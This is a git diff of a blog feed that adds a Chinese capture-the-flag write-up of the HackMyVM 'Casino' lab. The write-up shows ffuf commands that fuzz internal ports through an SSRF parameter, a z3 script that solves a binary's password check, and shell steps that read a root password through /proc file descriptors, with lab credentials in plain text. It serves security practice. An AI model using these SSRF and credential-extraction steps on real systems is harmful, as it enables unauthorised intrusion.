@@ -206,6 +206,7 @@
 <h4 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h4><p>切换到home目录下，有nitish和sam两个用户，sam目录进不去，在nitish目录的.dev目录下有个creds.txt</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112450.png" ></p>
 <p>有一个密码，接下来用ssh登陆nitish账户</p>
+<p>p4ssw0rdStr3r0n9</p>
 <p>sudo -l发现有个genie可以利用，在网上找现成的提权方式失败</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112652.png" ></p>
 <p>-h查看帮助，有一个-e执行cmd，但是还是失败了</p>
@@ -235,6 +236,68 @@
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113923.png" ></p>
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机涉及到的知识点比较多：ftp下载文件，远程计算器脚本的编写，ssh敲门打开端口，反弹shell的绕过方法，pkexec的提权，man查看使用手册（比–help详细），pyc反编译，python2中input的智能转换和动态载入的利用，都很值得学习。</p>
 <p>在整个过程中，信息搜集一如既往的重要。</p>
+]]></content>
+      <tags>
+        <tag>hackmyvm</tag>
+        <tag>复盘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hackmyvm casino复盘</title>
+    <url>/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Casino" >https://hackmyvm.eu/machines/machine.php?vm=Casino<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：medium</p>
+<p>靶机ip：192.168.64.82</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描扫到22和80端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165203.png" ></p>
+<p>先到80端口，有个登陆页面，不知道账号密码，先注册一个账号</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165317.png" ></p>
+<p>登陆进去后有个三个赌博游戏，起始金额是1000$，经过一番探索结合扫到的目录，我随便在猜点数的游戏把金额全部输光，接着界面就给我跳转到以下这个</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165533.png" ></p>
+<p>注意url是”<strong>&#x2F;casino&#x2F;explainmepls.php?learnabout&#x3D;en.wikipedia.org&#x2F;wiki&#x2F;Dice</strong>“，经过测试没办法文件包含查看一下文件，但是?learnabout&#x3D;<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> 会跳转，猜测是存在ssrf漏洞，验证一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165739.png" ></p>
+<p>会出现最开始看到的登陆页面，接着就fuzz一下对内有哪些端口开了（记得带上cookie）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i&lt;=<span class="number">65535</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> &gt;&gt; dictionary.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">先生成一个脚本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w dictionary.txt -u <span class="string">&#x27;http://192.168.64.82/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ&#x27;</span> -fw 284 -b <span class="string">&quot;PHPSPHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318182217.png" ></p>
+<p>扫到了6969端口，先访问看看</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002002.png" ></p>
+<p>是有东西的，扫一下目录看看</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u <span class="string">&quot;http://192.168.64.82/casino/explainmepls.php?learnabout=localhost:6969/FUZZ&quot;</span> -b <span class="string">&quot;PHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span> -fw 284</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004853.png" ></p>
+<p>扫到&#x2F;codebreakers，</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.23.29.png" ></p>
+<p>看到源码有个shimmer_rsa，访问之后意识一个私钥内容</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002436.png" ></p>
+<p>保存之后利用这个文件ssh登陆成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002651.png" ></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002957.png" ></p>
+<p>可以看到目录下有个pass，是可以执行的，是要猜密码，传到本地用ida分析看看</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.31.48.png"  alt="main函数"></p>
+<p>点击看一下第一个密码的checkpasswd函数</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319003547.png" ></p>
+<p>有很多个表达式去匹配，我想到用z3去运算出结果</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建26个变量，每个变量表示字符串中对应位置的字符</span></span><br><span class="line">a = [Int(<span class="string">&#x27;a[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Z3 solver 实例</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加字符串长度等于 26 的约束</span></span><br><span class="line">solver.add(<span class="built_in">len</span>(a) == <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加各种条件约束</span></span><br><span class="line">solver.add(a[<span class="number">0</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">1</span>] + a[<span class="number">6</span>] == <span class="number">208</span>)</span><br><span class="line">solver.add(a[<span class="number">2</span>] - a[<span class="number">4</span>] == <span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">3</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">4</span>] * a[<span class="number">25</span>] == <span class="number">10100</span>)</span><br><span class="line">solver.add(a[<span class="number">5</span>] + a[<span class="number">17</span>] == <span class="number">219</span>)</span><br><span class="line">solver.add(a[<span class="number">6</span>] - a[<span class="number">10</span>] == -<span class="number">11</span>)</span><br><span class="line">solver.add(a[<span class="number">7</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">8</span>] * a[<span class="number">17</span>] == <span class="number">11845</span>)</span><br><span class="line">solver.add(a[<span class="number">9</span>] - a[<span class="number">18</span>] == -<span class="number">7</span>)</span><br><span class="line">solver.add(a[<span class="number">10</span>] - a[<span class="number">24</span>] == <span class="number">1</span>)</span><br><span class="line">solver.add(a[<span class="number">11</span>] * a[<span class="number">4</span>] == <span class="number">9797</span>)</span><br><span class="line">solver.add(a[<span class="number">12</span>] - a[<span class="number">3</span>] == <span class="number">3</span>)</span><br><span class="line">solver.add(a[<span class="number">13</span>] * a[<span class="number">11</span>] == <span class="number">11252</span>)</span><br><span class="line">solver.add(a[<span class="number">14</span>] - a[<span class="number">13</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">15</span>] == a[<span class="number">23</span>])</span><br><span class="line">solver.add(a[<span class="number">16</span>] - a[<span class="number">8</span>] == -<span class="number">5</span>)</span><br><span class="line">solver.add(a[<span class="number">17</span>] * a[<span class="number">7</span>] == <span class="number">10815</span>)</span><br><span class="line">solver.add(a[<span class="number">18</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">19</span>] - a[<span class="number">0</span>] == -<span class="number">8</span>)</span><br><span class="line">solver.add(a[<span class="number">20</span>] - a[<span class="number">23</span>] == <span class="number">4</span>)</span><br><span class="line">solver.add(a[<span class="number">21</span>] + a[<span class="number">7</span>] == <span class="number">220</span>)</span><br><span class="line">solver.add(a[<span class="number">22</span>] - a[<span class="number">1</span>] == <span class="number">15</span>)</span><br><span class="line">solver.add(a[<span class="number">23</span>] == a[<span class="number">15</span>])</span><br><span class="line">solver.add(a[<span class="number">24</span>] * a[<span class="number">2</span>] == <span class="number">12654</span>)</span><br><span class="line">solver.add(a[<span class="number">25</span>] - a[<span class="number">12</span>] == -<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查约束是否满足</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(model[a[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;满足条件的字符串为：&quot;</span>, result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找不到满足条件的字符串&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跑出来的结果是“满足条件的字符串为： ihopethisisastrongpassword”</p>
+<p>这样就拿到第一个密码了，依次输入两个密码拿到一个&#x2F;bin&#x2F;sh，注意这里的点是</p>
+<p><strong>程序中open了&#x2F;opt&#x2F;root.pass，但是没有close，可以看一下这个文件相关的进程</strong></p>
+<p>“在linux中，每个进程的 <code>/proc/&lt;PID&gt;/fd</code> 目录包含了该进程打开的文件描述符的符号链接。你可以通过查看该目录来了解进程打开的文件描述符的相关信息，可以用<code>ls -l /proc/&lt;PID&gt;/fd</code>查看，而一个进程的PID可以用<code>lsof /path/to/your/file</code>查看”</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsof /opt/root.pass</span><br><span class="line">COMMAND PID    USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">sh      768 shimmer    3r   REG    8,1       15 522246 /opt/root.pass</span><br><span class="line">$ <span class="built_in">ls</span> -l /proc/768/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 1 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 10 -&gt; /dev/tty</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 2 -&gt; /dev/pts/0</span><br><span class="line">lr-x------ 1 shimmer shimmer 64 mar 18 17:43 3 -&gt; /opt/root.pass</span><br><span class="line">$ <span class="built_in">cd</span> /proc/768/fd</span><br><span class="line">$ <span class="built_in">cat</span> &lt;&amp;3</span><br><span class="line">masteradmin420</span><br></pre></td></tr></table></figure>
+
+<p>一顿操作，就拿到了root的密码，su登陆，提权成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004826.png" ></p>
+<h4 id="web代码复盘"><a href="#web代码复盘" class="headerlink" title="web代码复盘"></a>web代码复盘</h4><p>在games.php找到跳转explainmepls.php的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$money</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$game</span> != <span class="number">8</span>) &#123; <span class="comment">// 这里就是需要money=0，所以要把钱输光</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$game</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Shell_game&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Russian_roulette&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Dice&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">include_once</span> <span class="string">&quot;./games/error.php&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: explainmepls.php?learnabout=&#x27;</span> . <span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2001.00.46.png" ></p>
+<p>触发ssrf漏洞的地方，“<code>file_get_contents()</code> 函数用于从指定的 URL 中获取内容并将其输出。可以通过控制 <code>$learnabout</code> 变量来构造任意 URL”</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>wp说pass那块第一个密码可用angr模块解决，我自己看的时候先想到的是z3，最后也解出来了，后续要学一下</p>
+<p>最开始那个赌博游戏也是经过一番探索才找到ssrf那个点，而且刚找到的时候还以为是文件包含（知识不够牢固）关于ssrf利用，端口的fuzz也需要记住，还有就是最后文件打开那块，还能通过lsof找到相关进程，感觉这个思路以后还会遇到，也算是多学习到linux有关的知识了，总的来说这个靶场很值得学习回顾。</p>
+<p>所需知识点：ssrf漏洞利用，文件逆向，z3求解，linux进程号查找，端口扫描</p>
 ]]></content>
       <tags>
         <tag>hackmyvm</tag>
